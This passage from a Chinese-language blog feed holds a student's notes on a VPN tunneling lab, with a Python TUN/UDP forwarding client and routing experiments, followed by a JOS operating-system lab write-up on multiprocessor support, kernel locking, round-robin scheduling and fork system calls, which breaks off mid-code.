class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> select<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *TUNSETIFF = <span class="hljs-number">0x400454ca</span>IFF_TUN = <span class="hljs-number">0x0001</span>IFF_TAP = <span class="hljs-number">0x0002</span>IFF_NO_PI = <span class="hljs-number">0x1000</span>PORT = <span class="hljs-number">9090</span><span class="hljs-comment"># Create the tun interface</span>tun = os.open(<span class="hljs-string">"/dev/net/tun"</span>, os.O_RDWR)ifr = struct.pack(<span class="hljs-string">'16sH'</span>, <span class="hljs-string">b'jia%d'</span>, IFF_TUN | IFF_NO_PI)ifname_bytes = fcntl.ioctl(tun, TUNSETIFF, ifr)<span class="hljs-comment"># Get the interface name</span>ifname = ifname_bytes.decode(<span class="hljs-string">'UTF-8'</span>)[:<span class="hljs-number">16</span>].strip(<span class="hljs-string">"\x00"</span>)print(<span class="hljs-string">"Interface Name: &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip addr add 192.168.53.99/24 dev &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip link set dev &#123;&#125; up"</span>.format(ifname))sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-comment"># this will block until at least one interface is ready</span>ready, _, _ = select.select([sock, tun], [], [])<span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> ready:<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> sock:data, (ip, port) = sock.recvfrom(<span class="hljs-number">2048</span>)pkt = IP(data)print(<span class="hljs-string">"From socket &lt;==: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))<span class="hljs-comment">#we need to send the IP packet to the TUN interface</span>os.write(tun, bytes(pkt))<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> tun:<span class="hljs-comment"># read from the file</span>packet = os.read(tun, <span class="hljs-number">2048</span>)pkt = IP(packet)print(<span class="hljs-string">"From tun ==&gt;: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))sock.sendto(packet, (<span class="hljs-string">"10.0.2.5"</span>, <span class="hljs-number">9090</span>))</code></pre></li></ul><p>当我们选择ping的时候，可以看到ping成功</p><p><img src="/2020/12/13/VPN-Tunneling/5-2.PNG" srcset="/img/loading.gif" alt="5-2"></p><p>对于包流动的分析</p><p><img src="/2020/12/13/VPN-Tunneling/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p><p>数据包流动情况：执行命令时，通过 TUN 发包，client 程序检测到 TUN 接收到包后，读取并通过 socket 发给 VPN server；这时 server 程序又检测到 socket 收到包，取 出内层 IP 包并写到 TUN，VPN server 通过内部网发给主机 V；主机 V 收到 echo-request 包后回 复 echo-reply 包；该包到达 VPN server 后，server 程序又检测到 TUN 收到包，读取并通过 socket 发给主机 U；client 程序又检测到 socket 收到包，读取并写到 TUN 接口，完成通信。</p><p>之后再host U上面telnet host V，数据包流动情况和上面基本一样</p><p><img src="/2020/12/13/VPN-Tunneling/5-5.PNG" srcset="/img/loading.gif" alt="5-5"></p><p><img src="/2020/12/13/VPN-Tunneling/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p><h3 id="Task-6：隧道破除实验"><a href="#Task-6：隧道破除实验" class="headerlink" title="Task 6：隧道破除实验"></a>Task 6：隧道破除实验</h3><p>关闭tun_client.py,并不能看到输入的内容，此时TCP链接发送RST、ACK包，连接被断开</p><p><img src="/2020/12/13/VPN-Tunneling/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p><p>当我们重新运行时，之前在断开连接后输入的命令会显示出来，并且在运行py文件的terminal上面会有包发送和收到的打印</p><p><img src="/2020/12/13/VPN-Tunneling/6-2.PNG" srcset="/img/loading.gif" alt="6-2"></p><p>原因我认为是我们在破坏了VPN隧道之后，数据包不能到达，但是由于是TCP连接，会持续发包一段时间，这段时间内重新建立VPN隧道连接，那么TCP连接就可以重新得以建立，所以之后telnet的命令会显示出来</p><h3 id="Task-7：主机V上面的路由实验"><a href="#Task-7：主机V上面的路由实验" class="headerlink" title="Task 7：主机V上面的路由实验"></a>Task 7：主机V上面的路由实验</h3><ul><li>删除默认条目，添加发往192.168.53.0/24的数据包要通过192.168.60.1这个路由器的条目</li></ul><p><img src="/2020/12/13/VPN-Tunneling/7-1.PNG" srcset="/img/loading.gif" alt="7-1"></p><ul><li>测试，用主机U ping V，成功</li></ul><p><img src="/2020/12/13/VPN-Tunneling/7-2.PNG" srcset="/img/loading.gif" alt="7-2"></p><h3 id="Task-8：试验TUN的IP地址"><a href="#Task-8：试验TUN的IP地址" class="headerlink" title="Task 8：试验TUN的IP地址"></a>Task 8：试验TUN的IP地址</h3><p>更改IP后再次ping 192.168.60.101 ，并且我认为这时候一个是需要设置Host U上面的路由的，即需要选择哪个接口来发包，可以发现<strong>丢包位置是在VPN_Server</strong></p><p><img src="/2020/12/13/VPN-Tunneling/8-1.PNG" srcset="/img/loading.gif" alt="8-1"></p><p><strong>丢包原因：</strong>违反了反向路由机制，VPN_Server的应用层是从TUN接口收到数据包的，这时候进行模拟，模拟reply包从哪里发回去，由于未设置路由并且不是在同一个子网当中，所以会选择默认接口（在这里是10.0.2.5）而不是TUN接口，这就造成了输入和输出接口不一致（输入端口是TUN接口，输出是10.0.2.5的接口），所以会在收到这个包的时候将包丢弃</p><p><strong>解决方法：</strong>在VPN_Server上面设置路由，设置发往192.168.30.0/24子网的包是通过TUN接口的</p><p>再次运行ping 192.168.60.101，ping 成功（记得把task 7修改的路由表改回来或者重新添加）</p><p><img src="/2020/12/13/VPN-Tunneling/8-3.PNG" srcset="/img/loading.gif" alt="8-3"></p><h3 id="Task-9：试验TAP接口"><a href="#Task-9：试验TAP接口" class="headerlink" title="Task 9：试验TAP接口"></a>Task 9：试验TAP接口</h3><p>当我们修改配置对应的TAP接口，命名为jia0，并且设置他的IP地址为192.168.53.99，开始运行<code>ping 192.168.53.0/24</code>（注意设置对应的路由）</p><p>根据相应的代码</p><p><img src="/2020/12/13/VPN-Tunneling/9-2.PNG" srcset="/img/loading.gif" alt="9-2"></p><p><img src="/2020/12/13/VPN-Tunneling/9-1.PNG" srcset="/img/loading.gif" alt="9-1"></p><p>可以看到此时会产生一个ARP包，结合上面代码，会发现这是先构造了一个数据包，之后把这个包发送给TAP接口，而之后会由于打印出summary而显示在运行TUN.py的terminal上面</p><p><strong>判断是否是ARP请求并返回ARP应答实现思路：</strong>在while上面加一个条件判断，当读出的数据包是ARP请求的时候，进行一个write来返回</p><p>实现：</p><p><img src="/2020/12/13/VPN-Tunneling/9-4.PNG" srcset="/img/loading.gif" alt="9-4"></p><p><code>arping -I tap0 192.168.53.33</code>的时候，而在<code>arping -I tap0 1.2.3.4</code>的时候和下面结果一样</p><p><img src="/2020/12/13/VPN-Tunneling/9-3.PNG" srcset="/img/loading.gif" alt="9-3"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>oslab5_preemptive mutitasking</title>
    <link href="/2020/12/07/oslab5-preemptive-mutitasking/"/>
    <url>/2020/12/07/oslab5-preemptive-mutitasking/</url>
    
    <content type="html"><![CDATA[<h1 id="Preemptive-Mutitasking"><a href="#Preemptive-Mutitasking" class="headerlink" title="Preemptive Mutitasking"></a>Preemptive Mutitasking</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在提交的时候，由于换成优先级调度之后make grade不会是满分，所以就把优先级调度所写的算法注释了起来，如果需要检验，可以根据下面优先级调度算法的实现来取消部分注释即可</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>所要做的事情：</p><ul><li>使得JOS支持多CPU处理</li><li>实现进程调用来允许普通进程创建新的进程</li><li>实现协作式进程调度</li></ul><p>在SMP模型当中CPU分为两类：</p><ul><li>启动CPU（BSP）：负责初始化系统，启动操作系统</li><li>应用CPU（AP）：由BSP启动，具体哪一个CPU是BSP根据硬件以及BISO决定的</li></ul><blockquote><p>在 SMP 系统中，每个 CPU 都有一个附属的 LAPIC 单元。LAPIC 单元用于传递中断，并给它所属的 CPU 一个唯一的 ID。</p></blockquote><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p>首先，我们可以看到在lapic_init（）一开始就调用类这个函数，将从<code>lapicaddr</code>开始的4K大小的物理地址映射到了虚拟地址当中，并且返回起始位置，而在mmio_map_region（）当中，实际上是调用<code>boot_map_region（）</code>来建立所需映射</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><pre><code class="hljs c++"><span class="hljs-keyword">void</span> *mmio_map_region(<span class="hljs-keyword">physaddr_t</span> pa, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)&#123;<span class="hljs-comment">// Where to start the next region.  Initially, this is the</span><span class="hljs-comment">// beginning of the MMIO region.  Because this is static, its</span><span class="hljs-comment">// value will be preserved between calls to mmio_map_region</span><span class="hljs-comment">// (just like nextfree in boot_alloc).</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uintptr_t</span> base = MMIOBASE;<span class="hljs-comment">// Reserve size bytes of virtual memory starting at base and</span><span class="hljs-comment">// map physical pages [pa,pa+size) to virtual addresses</span><span class="hljs-comment">// [base,base+size).  Since this is device memory and not</span><span class="hljs-comment">// regular DRAM, you'll have to tell the CPU that it isn't</span><span class="hljs-comment">// safe to cache access to this memory.  Luckily, the page</span><span class="hljs-comment">// tables provide bits for this purpose; simply create the</span><span class="hljs-comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span><span class="hljs-comment">// write-through) in addition to PTE_W.  (If you're interested</span><span class="hljs-comment">// in more details on this, see section 10.5 of IA32 volume</span><span class="hljs-comment">// 3A.)</span><span class="hljs-comment">//</span><span class="hljs-comment">// Be sure to round size up to a multiple of PGSIZE and to</span><span class="hljs-comment">// handle if this reservation would overflow MMIOLIM (it's</span><span class="hljs-comment">// okay to simply panic if this happens).</span><span class="hljs-comment">//</span><span class="hljs-comment">// Hint: The staff solution uses boot_map_region.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Your code here:</span><span class="hljs-built_in">size</span> = ROUNDUP(<span class="hljs-built_in">size</span>, PGSIZE);<span class="hljs-keyword">if</span>(<span class="hljs-built_in">size</span> + base &gt; MMIOLIM)<span class="hljs-comment">//overflow</span>panic(<span class="hljs-string">"mmio_map_region overflow MMIOLIM"</span>);<span class="hljs-keyword">int</span> perm = PTE_PCD | PTE_PWT | PTE_W;boot_map_region(kern_pgdir, base, <span class="hljs-built_in">size</span>, pa, perm);<span class="hljs-keyword">void</span> *ret = (<span class="hljs-keyword">void</span> *)base;base += <span class="hljs-built_in">size</span>;<span class="hljs-keyword">return</span> ret;&#125;</code></pre><p><strong>应用处理器（AP）引导程序</strong></p><blockquote><p>在启动AP之前，BSP需要搜集多处理器的信息，比如总共有多少CPU，它们的LAPIC ID以及LAPIC MMIO地址。mp_init()函数从BIOS中读取这些信息。具体代码在mp_init()中，该函数会在进入内核后被i386_init()调用，主要作用就是读取mp configuration table中保存的CPU信息，<strong>初始化cpus数组，ncpu（总共多少可用CPU），bootcpu指针（指向BSP对应的CpuInfo结构）</strong>。</p></blockquote><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h3><blockquote><p>Read <code>boot_aps()</code> and <code>mp_main()</code> in <code>kern/init.c</code>, and the assembly code in <code>kern/mpentry.S</code>. Make sure you understand the control flow transfer during the bootstrap of APs. Then modify your implementation of <code>page_init()</code> in <code>kern/pmap.c</code> to avoid adding the page at <code>MPENTRY_PADDR</code> to the free list, so that we can safely copy and run AP bootstrap code at that physical address. Your code should pass the updated <code>check_page_free_list()</code> test (but might fail the updated <code>check_kern_pgdir()</code> test, which we will fix soon).</p></blockquote><blockquote><p>真正启动AP的是在boot_aps()中，该函数遍历cpus数组，一个接一个启动所有的AP，当一个AP启动后会执行kern/mpentry.S中的代码，然后跳转到mp_main()中，该函数为当前AP设置GDT，TTS，最后设置cpus数组中当前CPU对应的结构的cpu_status为CPU_STARTED。更多关于SMP可以参考</p><p><a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/MPspec.pdf" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.828/2018/readings/ia32/MPspec.pdf</a></p><p><a href="https://wenku.baidu.com/view/615ea3c6aa00b52acfc7ca97.htmlhttps://pdos.csail.mit.edu/6.828/2018/readings/ia32/MPspec.pdf" target="_blank" rel="noopener">https://wenku.baidu.com/view/615ea3c6aa00b52acfc7ca97.html</a></p></blockquote><p>对于此程序运行过程的理解：（这时候是运行在启动CPU上，即BSP，工作在保护模式）</p><ol><li><p>i386_init（）调用了boot_aps（），开始引导其他的CPU运行</p><p> <img src="/2020/12/07/oslab5-preemptive-mutitasking/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p></li><li><p>boot_aps（）调用memmov（），将代码加载到固定位置</p><p> <img src="/2020/12/07/oslab5-preemptive-mutitasking/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p></li><li><p>最后调用labpic_startap来执行对应的CPU</p></li></ol><p>而exercise2实际上就是标记<code>MPENTRY_PADDR</code>开始的一个物理页面为已经使用，加一个if判断即可</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>page_init(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-keyword">size_t</span> i;<span class="hljs-keyword">size_t</span> io_hole_start_page = (<span class="hljs-keyword">size_t</span>)IOPHYSMEM / PGSIZE;<span class="hljs-keyword">size_t</span> kernel_end_page = PADDR(boot_alloc(<span class="hljs-number">0</span>)) / PGSIZE;<span class="hljs-comment">//这里调了半天，boot_alloc返回的是虚拟地址，需要转为物理地址</span><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; npages; i++) &#123;<span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i &gt;= io_hole_start_page &amp;&amp; i &lt; kernel_end_page) &#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == MPENTRY_PADDR / PGSIZE) &#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125; <span class="hljs-keyword">else</span> &#123;pages[i].pp_ref = <span class="hljs-number">0</span>;pages[i].pp_link = page_free_list;page_free_list = &amp;pages[i];&#125;&#125;&#125;</code></pre><p><strong>每个CPU的状态以及初始化</strong></p><p>可以通过CpuInfo结构来看到定义的CPU的信息</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>而cpunum（）则会返回调用该函数的CPU的ID，而thiscpu的宏定义则是获取当前CPU对应的CpuInfo结构</p><h3 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h3><blockquote><p>Modify <code>mem_init_mp()</code> (in <code>kern/pmap.c</code>) to map per-CPU stacks starting at <code>KSTACKTOP</code>, as shown in <code>inc/memlayout.h</code>. The size of each stack is <code>KSTKSIZE</code> bytes plus <code>KSTKGAP</code> bytes of unmapped guard pages. Your code should pass the new check in <code>check_kern_pgdir()</code></p></blockquote><p>从文档的描述当中我们可以得知，会给每个CPU分配一个内核栈，而BSP（CPU0）的起始位置是KSTACKTOP,每个内核栈的大小回事KSTACKSIZE个字节，而KSTACKGAP字节作为缓冲区检测，防止栈溢出，之后就是CPU1的内核栈，以此类推即可</p><p>根据inc/memlayout.h来写对应的映射即可</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>mem_init_mp(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// Map per-CPU stacks starting at KSTACKTOP, for up to 'NCPU' CPUs.</span><span class="hljs-comment">//</span><span class="hljs-comment">// For CPU i, use the physical memory that 'percpu_kstacks[i]' refers</span><span class="hljs-comment">// to as its kernel stack. CPU i's kernel stack grows down from virtual</span><span class="hljs-comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span><span class="hljs-comment">// divided into two pieces, just like the single stack you set up in</span><span class="hljs-comment">// mem_init:</span><span class="hljs-comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span><span class="hljs-comment">//          -- backed by physical memory</span><span class="hljs-comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span><span class="hljs-comment">//          -- not backed; so if the kernel overflows its stack,</span><span class="hljs-comment">//             it will fault rather than overwrite another CPU's stack.</span><span class="hljs-comment">//             Known as a "guard page".</span><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><span class="hljs-comment">//</span><span class="hljs-comment">// LAB 4: Your code here:</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NCPU; i++)&#123;boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE - i * (KSTKSIZE + KSTKGAP), KSTKSIZE, PADDR(percpu_kstacks[i]), PTE_W);&#125;&#125;</code></pre><h3 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h3><p> 每个CPU都需要单独的TSS和TSS描述符来指定对应的内核栈</p><p>trap_init_percpu（）的作用就是初始化并且加载TSS以及IDT，具体的实现思路就是通过thiscpu来获得当前调用这个函数的CPU的CpuInfo结构，而之后cpuid就更容易了，之后就是thiscpu-&gt;cpu_ts当作当前cpu的TSS，而<code>gdt[(GD_TSS0 &gt;&gt; 3) + i]</code>作为TSS描述符</p><p>具体实现</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>trap_init_percpu(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// LAB 4: Your code here:</span><span class="hljs-comment">// Setup a TSS so that we get the right stack</span><span class="hljs-comment">// when we trap to the kernel.</span>thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - cpuid * (KSTKSIZE + KSTKGAP);thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;thiscpu-&gt;cpu_ts.ts_iomb = <span class="hljs-keyword">sizeof</span>(struct Taskstate);<span class="hljs-comment">// Initialize the TSS slot of the gdt.</span>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="hljs-keyword">uint32_t</span>) (&amp;(thiscpu-&gt;cpu_ts)),<span class="hljs-keyword">sizeof</span>(struct Taskstate) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()].sd_s = <span class="hljs-number">0</span>;<span class="hljs-comment">// Load the TSS selector (like other segment selectors, the</span><span class="hljs-comment">// bottom three bits are special; we leave them 0)</span>ltr(GD_TSS0 + (cpunum() &lt;&lt; <span class="hljs-number">3</span>));<span class="hljs-comment">// Load the IDT</span>lidt(&amp;idt_pd);&#125;</code></pre><p><strong>锁</strong></p><blockquote><p>多个CPU在同时执行的之后，需要解决可能产生的竞争问题，在这里采用了big kernel lock的全局锁的方法，每个进程可以持有该锁，当进程从用户态向内核态切换的时候加锁，而当退出内核态的时候解锁，这就保证了只有一个CPU能够执行内核态的代码</p></blockquote><p>对应的lock_kernel（）和unlock_kernal（）定义在spinlock.c当中</p><h3 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h3><p>就直接在对应位置加锁解锁就行了</p><ul><li><p>首先在i386_init（）函数中，BSP在唤醒其他的CPU的时候加锁</p>  <pre><code class="hljs c++"><span class="hljs-comment">// Starting non-boot CPUs</span>lock_kernel();boot_aps();</code></pre></li><li><p>在mp_main（）当中，AP在执行sched_yield（）之前加锁</p>  <pre><code class="hljs c++"><span class="hljs-comment">// Your code here:</span>lock_kernel();sched_yield();</code></pre></li><li><p>在trap（）里面，我们也需要加锁，因为进程从用户态切换到内核态是通过中断来实现的</p>  <pre><code class="hljs c++"><span class="hljs-comment">// LAB 4: Your code here.</span>assert(curenv);lock_kernel();</code></pre></li><li><p>在env_run（）当中，当使用完iret实现从内核态退出的啥时候解锁</p>  <pre><code class="hljs c++">lcr3(PADDR(e-&gt;env_pgdir));unlock_kernel();<span class="hljs-comment">//不放到最后是因为在env_pop_tf()后面的语句不会执行到</span>env_pop_tf(&amp;e-&gt;env_tf);</code></pre></li></ul><p><strong>Round—Robin 调度</strong></p><p>具体是实现过程</p><ul><li>实现sched_yield（），该函数的作用是选择一个进程来运行，而之后从当前进程的Env结构开始搜索envs数组，找到下一个可运行的进程，然后调用env_run（）在当前cpu来运行新的进程</li><li>同时实现一个新的系统调用sys_yield（），来进行进程之间的切换</li></ul><h3 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise 6"></a>Exercise 6</h3><p>sched_yield（）的功能上面已经提到，按上面说的实现即可，同时还要注意，必须考虑到没有找到合适的进程的情况，此时重新执行前面的进程，否则CPU将会停止运行</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>sched_yield(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">idle</span>;</span><span class="hljs-comment">// Implement simple round-robin scheduling.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Search through 'envs' for an ENV_RUNNABLE environment in</span><span class="hljs-comment">// circular fashion starting just after the env this CPU was</span><span class="hljs-comment">// last running.  Switch to the first such environment found.</span><span class="hljs-comment">//</span><span class="hljs-comment">// If no envs are runnable, but the environment previously</span><span class="hljs-comment">// running on this CPU is still ENV_RUNNING, it's okay to</span><span class="hljs-comment">// choose that environment.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Never choose an environment that's currently running on</span><span class="hljs-comment">// another CPU (env_status == ENV_RUNNING). If there are</span><span class="hljs-comment">// no runnable environments, simply drop through to the code</span><span class="hljs-comment">// below to halt the cpu.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">int</span> start = <span class="hljs-number">0</span>;<span class="hljs-keyword">int</span> j;<span class="hljs-keyword">if</span> (curenv) &#123;start = ENVX(curenv-&gt;env_id) + <span class="hljs-number">1</span>;<span class="hljs-comment">//从当前Env结构的后一个开始查找</span>&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NENV; i++) &#123;j = (start + i) % NENV;<span class="hljs-keyword">if</span> (envs[j].env_status == ENV_RUNNABLE) &#123;<span class="hljs-comment">//找到可以作为下一个运行的进程</span>env_run(&amp;envs[j]);&#125;&#125;<span class="hljs-keyword">if</span> (curenv &amp;&amp; curenv-&gt;env_status == ENV_RUNNING) &#123;env_run(curenv);&#125;<span class="hljs-comment">// sched_halt never returns</span>sched_halt();&#125;</code></pre><p>之后再<code>kern/syscall.c</code>里面加入对应的情况</p><pre><code class="hljs c++"><span class="hljs-keyword">case</span> SYS_yield:ret = <span class="hljs-number">0</span>;sys_yield();<span class="hljs-keyword">break</span>;</code></pre><p>在<code>kern/init.c</code>中的用户进程进行修改</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined(TEST)</span><span class="hljs-comment">// Don't touch -- used by grading script!</span>ENV_CREATE(TEST, ENV_TYPE_USER);<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><span class="hljs-comment">// Touch all you want.</span>ENV_CREATE(user_yield, ENV_TYPE_USER);ENV_CREATE(user_yield, ENV_TYPE_USER);ENV_CREATE(user_yield, ENV_TYPE_USER);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// TEST*</span></span><span class="hljs-comment">// Schedule and run the first user environment!</span>sched_yield();</code></pre><p><strong>进程创建的系统调用</strong></p><p>现在要实现新的系统调用，该系统调用允许创建进程并且运行新的进程，具体要实现的系统调用如下</p><ul><li>sys_exofork：创建一个新的进程，寄存器与父进程一样，在父进程中返回值为子进程的envid，而在子进程当中返回值为0</li><li>sys_env_set_status：设置一个特定进程的状态为ENV_RUNNABLE或者ENV_NOT_RUNNABLE</li><li>sys_page_alloc：为指定进程分配物理页</li><li>sys_page_map：拷贝页表，使得指定进程能够和当前进程有相同的映射关系</li><li>sys_page_unmap：接触页映射关系</li></ul><h3 id="Exercise-7"><a href="#Exercise-7" class="headerlink" title="Exercise 7"></a>Exercise 7</h3><blockquote><p>Implement the system calls described above in <code>kern/syscall.c</code>. You will need to use various functions in <code>kern/pmap.c</code> and <code>kern/env.c</code>, particularly <code>envid2env()</code>. For now, whenever you call <code>envid2env()</code>, pass 1 in the <code>checkperm</code> parameter. Be sure you check for any invalid system call arguments, returning <code>-E_INVAL</code> in that case. Test your JOS kernel with <code>user/dumbfork</code> and make sure it works before proceeding.</p></blockquote><p>按照上面的来实现对应的系统调用，该联系重点是<code>user/dumbfork.c</code>里面的duppage（）函数，它利用 <code>sys_page_alloc()</code> 为子进程分配空闲物理页，再使用<code>sys_page_map()</code> 将该新物理页映射到内核的交换区 <code>UTEMP</code>，方便在内核态进行拷贝操作。在拷贝结束后，利用 <code>sys_page_unmap()</code> 将交换区的映射删除。</p><ul><li><p><strong>sys_exofork（）函数</strong></p><p>  在该函数中，子进程复制了父进程的 trapframe，此后把 trapframe 中的 eax 的值设为了0。最后，返回了子进程的 id。</p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">envid_t</span>sys_exofork(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// Create the new environment with env_alloc(), from kern/env.c.</span><span class="hljs-comment">// It should be left as env_alloc created it, except that</span><span class="hljs-comment">// status is set to ENV_NOT_RUNNABLE, and the register set is copied</span><span class="hljs-comment">// from the current environment -- but tweaked so sys_exofork</span><span class="hljs-comment">// will appear to return 0.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_exofork not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> ret = env_alloc(&amp;e, curenv-&gt;env_id);    <span class="hljs-comment">//分配一个Env结构</span><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> ret;&#125;e-&gt;env_tf = curenv-&gt;env_tf;<span class="hljs-comment">//寄存器状态保持一致</span>e-&gt;env_status = ENV_NOT_RUNNABLE;    <span class="hljs-comment">//不能运行</span>e-&gt;env_tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;         <span class="hljs-comment">//新进程的返回值为0</span><span class="hljs-keyword">return</span> e-&gt;env_id;&#125;</code></pre></li><li><p><strong>sys_page_alloc（）</strong></p><p>  在进程envid的地址va分配一个权限为perm的页面</p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_page_alloc(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">void</span> *va, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Hint: This function is a wrapper around page_alloc() and</span><span class="hljs-comment">//   page_insert() from kern/pmap.c.</span><span class="hljs-comment">//   Most of the new code you write should be to check the</span><span class="hljs-comment">//   parameters for correctness.</span><span class="hljs-comment">//   If page_insert() fails, remember to free the page you</span><span class="hljs-comment">//   allocated!</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_page_alloc not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> ret = envid2env(envid, &amp;e, <span class="hljs-number">1</span>);   <span class="hljs-comment">//envid对应的env结构</span><span class="hljs-keyword">if</span> ((va &gt;= (<span class="hljs-keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">int</span> flag = PTE_U | PTE_P;<span class="hljs-keyword">if</span> ((perm &amp; flag) != flag) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pg</span> = <span class="hljs-title">page_alloc</span>(1);</span>     <span class="hljs-comment">//分配物理页</span><span class="hljs-keyword">if</span> (!pg) <span class="hljs-keyword">return</span> -E_NO_MEM;      <span class="hljs-comment">//未分配成功</span>ret = page_insert(e-&gt;env_pgdir, pg, va, perm);<span class="hljs-comment">//建立映射关系</span><span class="hljs-keyword">if</span> (ret) &#123;page_free(pg);<span class="hljs-keyword">return</span> ret;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></li><li><p><strong>sys_page_map（）函数</strong></p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_page_map(<span class="hljs-keyword">envid_t</span> srcenvid, <span class="hljs-keyword">void</span> *srcva,     <span class="hljs-keyword">envid_t</span> dstenvid, <span class="hljs-keyword">void</span> *dstva, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Hint: This function is a wrapper around page_lookup() and</span><span class="hljs-comment">//   page_insert() from kern/pmap.c.</span><span class="hljs-comment">//   